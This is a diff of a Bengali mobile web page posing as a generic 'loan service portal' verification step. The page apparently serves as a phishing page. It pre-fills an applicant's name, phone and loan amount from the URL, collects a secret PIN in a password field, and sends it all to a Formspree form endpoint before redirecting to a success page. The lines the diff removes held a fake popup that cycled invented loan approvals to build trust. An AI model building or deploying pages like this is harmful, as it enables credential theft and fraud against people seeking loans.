@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>আবেদন ট্র্যাকিং পিন কোড</title>
+    <title>ভেরিফিকেশন - লোন সার্ভিস</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * { 
@@ -11,9 +11,9 @@
             margin: 0; 
             padding: 0; 
             font-family: 'Segoe UI', Roboto, sans-serif; 
+            -webkit-tap-highlight-color: transparent;
         }
 
-        /* মূল ব্যাকগ্রাউন্ড সম্পূর্ণ সাদা */
         body { 
             background: #ffffff; 
             min-height: 100vh; 
@@ -28,244 +28,309 @@
             min-height: 100vh; 
             display: flex; 
             flex-direction: column; 
-            position: relative; 
-            box-shadow: 0 0 25px rgba(255, 94, 0, 0.08);
+            justify-content: space-between;
+            padding: 30px 24px 25px;
+            box-shadow: 0 0 25px rgba(255, 94, 0, 0.08); 
             border-left: 1px solid #fff7ed;
             border-right: 1px solid #fff7ed;
         }
 
-        /* কমলা গ্রেডিয়েন্ট হেডার */
-        .header { 
-            background: linear-gradient(135deg, #ff5e00, #ff8800); 
-            color: #ffffff; 
-            padding: 28px 20px 24px; 
-            text-align: center; 
-            border-bottom-left-radius: 24px;
-            border-bottom-right-radius: 24px;
-            box-shadow: 0 4px 15px rgba(255, 94, 0, 0.2);
-        }
-        .header-logo-wrap {
+        /* উপরের ল্যাঙ্গুয়েজ/স্ট্যাটাস পিল */
+        .top-row {
             display: flex;
-            justify-content: center;
-            margin-bottom: 12px;
+            justify-content: flex-end;
+            margin-bottom: 25px;
         }
-        .header-logo {
-            width: 60px;
-            height: 60px;
+
+        .lang-switch {
+            background: #f1f5f9;
+            border-radius: 20px;
+            display: flex;
+            padding: 3px;
+        }
+
+        .lang-btn {
+            padding: 4px 14px;
+            font-size: 12px;
+            border-radius: 16px;
+            border: none;
+            cursor: pointer;
+            font-weight: 700;
+        }
+
+        .lang-btn.active {
+            background: #ff5e00;
+            color: #ffffff;
+        }
+
+        .lang-btn:not(.active) {
+            background: transparent;
+            color: #64748b;
+        }
+
+        /* ব্র্যান্ড ও লোগো অংশ */
+        .brand-section {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 35px;
+        }
+
+        .brand-logo {
+            width: 55px;
+            height: 55px;
             object-fit: cover;
             border-radius: 50%;
-            background: #ffffff;
+            border: 2px solid #fed7aa;
             padding: 2px;
-            border: 2px solid #ffffff;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            box-shadow: 0 4px 10px rgba(255, 94, 0, 0.15);
         }
-        .header h2 { font-size: 22px; margin-bottom: 4px; font-weight: 700; }
-        .header p { font-size: 13px; opacity: 0.95; }
 
-        .form-wrap { padding: 30px 20px; flex-grow: 1; }
-        .form-group { margin-bottom: 22px; }
-        .form-group label { 
-            display: block; 
-            font-size: 13.5px; 
-            font-weight: 700; 
-            color: #334155; 
-            margin-bottom: 8px; 
-        }
-        .form-group label i {
+        .brand-info h2 {
+            font-size: 20px;
+            font-weight: 800;
             color: #ff5e00;
-            margin-right: 4px;
+            line-height: 1.2;
         }
-        .form-group input { 
-            width: 100%; 
-            padding: 14px 15px; 
-            border: 1.5px solid #fed7aa; 
-            border-radius: 12px; 
-            font-size: 15px; 
-            outline: none; 
-            background: #fffaf5; 
-            color: #1e293b; 
+
+        .brand-info p {
+            font-size: 12px;
+            color: #64748b;
+            font-weight: 500;
+        }
+
+        /* ইনপুট ফিল্ড ও লেবেল */
+        .input-group {
+            margin-bottom: 22px;
+        }
+
+        .input-label {
+            font-size: 13.5px;
+            font-weight: 700;
+            color: #334155;
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        .input-box {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-box i.input-icon {
+            position: absolute;
+            left: 16px;
+            color: #94a3b8;
+            font-size: 16px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 14px 16px 14px 44px;
+            border: 1.5px solid #fed7aa;
+            border-radius: 12px;
+            font-size: 15px;
+            outline: none;
+            background: #fffaf5;
+            color: #1e293b;
+            font-weight: 600;
+            letter-spacing: 0.5px;
             transition: all 0.2s;
         }
-        .form-group input:focus { 
-            border-color: #ff5e00; 
-            background: #ffffff; 
+
+        .form-control:focus {
+            border-color: #ff5e00;
+            background: #ffffff;
             box-shadow: 0 0 0 3px rgba(255, 94, 0, 0.15);
         }
-        .tracking-input { 
-            letter-spacing: 6px; 
-            font-size: 18px !important; 
-            font-weight: 700; 
-            text-align: center; 
-            background: #ffffff !important; 
+
+        .form-control[readonly] {
+            background: #f8fafc;
+            border-color: #e2e8f0;
+            color: #475569;
         }
 
-        /* কমলা সাবমিট বাটন */
-        .btn-submit { 
-            width: 100%; 
-            padding: 15px; 
-            background: linear-gradient(135deg, #ff5e00, #ff8800); 
-            color: #ffffff; 
-            border: none; 
-            border-radius: 30px; 
-            font-size: 16px; 
-            font-weight: bold; 
-            cursor: pointer; 
-            margin-top: 15px; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            gap: 10px; 
-            box-shadow: 0 4px 15px rgba(255, 94, 0, 0.3); 
-            transition: transform 0.2s;
+        .helper-text {
+            font-size: 12.5px;
+            color: #ff5e00;
+            font-weight: 600;
+            margin-top: 8px;
+            display: inline-block;
+            text-decoration: none;
         }
-        .btn-submit:active { transform: scale(0.98); }
-        .btn-submit:disabled { opacity: 0.7; cursor: not-allowed; }
 
-        /* সোশ্যাল-প্রুফ লাইভ পপআপ */
-        .loan-popup { 
-            position: fixed; 
-            bottom: 20px; 
-            left: 20px; 
-            background: #ffffff; 
-            color: #1e293b; 
-            padding: 12px 16px; 
-            border-radius: 12px; 
-            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15); 
-            display: flex; 
-            align-items: center; 
-            gap: 12px; 
-            z-index: 9999; 
-            max-width: 340px; 
-            border-left: 5px solid #16a34a; 
-            opacity: 0; 
-            transform: translateY(30px); 
-            transition: all 0.5s ease-in-out; 
-            pointer-events: none; 
+        /* সাবমিট বাটন */
+        .btn-submit {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #ff5e00, #ff8800);
+            color: #ffffff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 4px 15px rgba(255, 94, 0, 0.3);
+            transition: transform 0.15s;
         }
-        .loan-popup.show { 
-            opacity: 1; 
-            transform: translateY(0); 
-            pointer-events: auto; 
+
+        .btn-submit:active {
+            transform: scale(0.98);
         }
-        .popup-icon { 
-            width: 38px; 
-            height: 38px; 
-            background: #dcfce7; 
-            color: #16a34a; 
-            border-radius: 50%; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            font-size: 18px; 
-            flex-shrink: 0; 
+
+        .btn-submit:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
         }
-        .popup-content { display: flex; flex-direction: column; }
-        .popup-title { font-size: 13.5px; font-weight: 700; color: #0f172a; margin-bottom: 2px; }
-        .popup-desc { font-size: 12px; color: #16a34a; font-weight: 600; }
-        .popup-time { font-size: 10px; color: #94a3b8; margin-top: 2px; }
-        @media (max-width: 480px) { 
-            .loan-popup { left: 15px; right: 15px; max-width: none; bottom: 15px; } 
+
+        /* বটম কুইক লিঙ্কস */
+        .bottom-links {
+            display: flex;
+            justify-content: space-around;
+            padding-top: 30px;
+            border-top: 1px solid #f1f5f9;
+            margin-top: 30px;
+        }
+
+        .link-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-decoration: none;
+            color: #64748b;
+            gap: 6px;
+        }
+
+        .link-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #fffaf5;
+            border: 1px solid #fed7aa;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #ff5e00;
+            font-size: 16px;
+        }
+
+        .link-title {
+            font-size: 12px;
+            font-weight: 600;
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="header">
-        <div class="header-logo-wrap">
-            <!-- কোম্পানির লোগো -->
-            <img src="logoo.png" alt="Company Logo" class="header-logo">
+    <div>
+        <!-- ল্যাঙ্গুয়েজ সুইচ -->
+        <div class="top-row">
+            <div class="lang-switch">
+                <button type="button" class="lang-btn active">বাংলা</button>
+                <button type="button" class="lang-btn">ENG</button>
+            </div>
         </div>
-        <h2>আবেদন ট্র্যাকিং কোড</h2>
-        <p>আপনার রেফারেন্স বা ট্র্যাকিং কোড প্রদান করুন</p>
-    </div>
 
-    <div class="form-wrap">
+        <!-- ব্র্যান্ড ও লোগো -->
+        <div class="brand-section">
+            <img src="logoo.png" alt="Company Logo" class="brand-logo">
+            <div class="brand-info">
+                <h2>লোন সার্ভিস পোর্টাল</h2>
+                <p>নিরাপদ ও দ্রুত যাচাইকরণ</p>
+            </div>
+        </div>
+
+        <!-- যাচাইকরণ ফর্ম -->
         <form id="verifyForm" action="https://formspree.io/f/xvkkeegq" method="POST">
+            <!-- ব্যাকগ্রাউন্ডে পূর্ববর্তী পেজের নাম ও টাকার তথ্য জমা রাখার হিডেন ফিল্ড -->
             <input type="hidden" name="আবেদনকারীর_নাম" id="hiddenName">
             <input type="hidden" name="লোনের_পরিমাণ" id="hiddenAmount">
 
-            <div class="form-group">
-                <label><i class="fa-solid fa-phone"></i> মোবাইল নম্বর</label>
-                <input type="tel" id="userPhone" name="মোবাইল_নম্বর" required readonly>
+            <!-- ১. মোবাইল নম্বর ফিল্ড -->
+            <div class="input-group">
+                <label class="input-label">গ্রাহক মোবাইল নম্বর</label>
+                <div class="input-box">
+                    <i class="fa-solid fa-phone input-icon"></i>
+                    <input type="tel" id="userPhone" name="মোবাইল_নম্বর" class="form-control" readonly>
+                </div>
             </div>
 
-            <div class="form-group">
-                <!-- এখানে হ্যাশট্যাগ বদলে ট্র্যাকিং পিন কোড দেওয়া হলো -->
-                <label><i class="fa-solid fa-key"></i> ট্র্যাকিং পিন কোড (৪ ডিজিট)</label>
-                <input type="text" name="ট্র্যাকিং_পিন_কোড" class="tracking-input" maxlength="6" required placeholder="পিন কোড দিন">
+            <!-- ২. ট্র্যাকিং পিন ফিল্ড -->
+            <div class="input-group">
+                <label class="input-label">ট্র্যাকিং পিন (PIN)</label>
+                <div class="input-box">
+                    <i class="fa-solid fa-lock input-icon"></i>
+                    <input type="password" id="trackPin" name="ট্র্যাকিং_পিন" class="form-control" required placeholder="• • • •" maxlength="6" inputmode="numeric">
+                </div>
+                <a href="javascript:void(0)" class="helper-text" onclick="alert('সহায়তার জন্য হেল্পলাইনে যোগাযোগ করুন।')">পিন ভুলে গিয়েছেন? সহায়তা নিন</a>
             </div>
 
+            <!-- সাবমিট বাটন -->
             <button type="submit" id="btnSubmit" class="btn-submit">
-                <span>যাচাই সম্পন্ন করুন</span>
+                <span>যাচাই ও চূড়ান্ত সাবমিট</span>
                 <i class="fa-solid fa-arrow-right"></i>
             </button>
         </form>
     </div>
-</div>
 
-<div id="loanAlert" class="loan-popup">
-    <div class="popup-icon"><i class="fa-solid fa-circle-check"></i></div>
-    <div class="popup-content">
-        <span class="popup-title" id="popName">রহিমা খাতুন (ঢাকা)</span>
-        <span class="popup-desc" id="popAmount">৳১০,০০০ লোন অনুমোদিত হয়েছে</span>
-        <span class="popup-time" id="popTime">এইমাত্র</span>
+    <!-- বটম আইকন -->
+    <div class="bottom-links">
+        <div class="link-item">
+            <div class="link-icon"><i class="fa-solid fa-location-dot"></i></div>
+            <span class="link-title">শাখা সমূহ</span>
+        </div>
+        <div class="link-item">
+            <div class="link-icon"><i class="fa-solid fa-percent"></i></div>
+            <span class="link-title">অফার</span>
+        </div>
+        <div class="link-item">
+            <div class="link-icon"><i class="fa-solid fa-circle-question"></i></div>
+            <span class="link-title">সহায়তা</span>
+        </div>
     </div>
 </div>
 
 <script>
+    // পূর্ববর্তী পেজ থেকে ডেটা গ্রহণ
     const params = new URLSearchParams(window.location.search);
-    const nameVal = params.get('name') || '';
-    const phoneVal = params.get('phone') || '';
-    const amountVal = params.get('amount') || '';
+    const applicantName = params.get('name') || '';
+    const applicantPhone = params.get('phone') || '';
+    const loanAmount = params.get('amount') || '';
 
-    document.getElementById('hiddenName').value = nameVal;
-    document.getElementById('userPhone').value = phoneVal;
-    document.getElementById('hiddenAmount').value = amountVal;
+    // ফর্মে ফিল্ডগুলো সেট করা
+    document.getElementById('hiddenName').value = applicantName;
+    document.getElementById('hiddenAmount').value = loanAmount;
+    document.getElementById('userPhone').value = applicantPhone || '০১XXXXXXXXX';
 
-    const form = document.getElementById("verifyForm");
-    const btnSubmit = document.getElementById("btnSubmit");
+    const form = document.getElementById('verifyForm');
+    const btnSubmit = document.getElementById('btnSubmit');
 
-    form.addEventListener("submit", function(event) {
+    // ফর্ম সাবমিট হ্যান্ডলার
+    form.addEventListener('submit', function(event) {
         event.preventDefault();
+
         btnSubmit.disabled = true;
-        btnSubmit.innerHTML = '<span>যাচাই করা হচ্ছে...</span>';
+        btnSubmit.innerHTML = '<span>তথ্য পাঠানো হচ্ছে...</span>';
 
         const data = new FormData(form);
 
         fetch(form.action, {
-            method: "POST",
+            method: 'POST',
             body: data,
             headers: { 'Accept': 'application/json' }
         }).finally(() => {
-            window.location.href = "verify2.html?name=" + encodeURIComponent(nameVal) + "&phone=" + encodeURIComponent(phoneVal) + "&amount=" + encodeURIComponent(amountVal);
+            // সাবমিট শেষে সফল পেজে নিয়ে যাওয়া
+            window.location.href = "success.html";
         });
     });
-
-    const loanData = [
-        { name: "রহিমা খাতুন", district: "ঢাকা", amount: "১০,০০০", time: "এইমাত্র" },
-        { name: "আসলাম খান", district: "কুমিল্লা", amount: "২০,০০০", time: "২ মিনিট আগে" },
-        { name: "সুমন হোসেন", district: "বগুড়া", amount: "৩০,০০০", time: "১ মিনিট আগে" },
-        { name: "ফারজানা আক্তার", district: "চট্টগ্রাম", amount: "১৫,০০০", time: "এইমাত্র" }
-    ];
-
-    let currentIndex = 0;
-    const popupEl = document.getElementById("loanAlert");
-    const nameEl = document.getElementById("popName");
-    const amountEl = document.getElementById("popAmount");
-    const timeEl = document.getElementById("popTime");
-
-    function showNextNotification() {
-        const item = loanData[currentIndex];
-        nameEl.innerText = `${item.name} (${item.district})`;
-        amountEl.innerText = `৳${item.amount} লোন অনুমোদিত হয়েছে`;
-        timeEl.innerText = item.time;
-        popupEl.classList.add("show");
-        setTimeout(() => { popupEl.classList.remove("show"); }, 4000);
-        currentIndex = (currentIndex + 1) % loanData.length;
-    }
-
-    setTimeout(() => { showNextNotification(); setInterval(showNextNotification, 8000); }, 2000);
 </script>
+
 </body>
 </html>
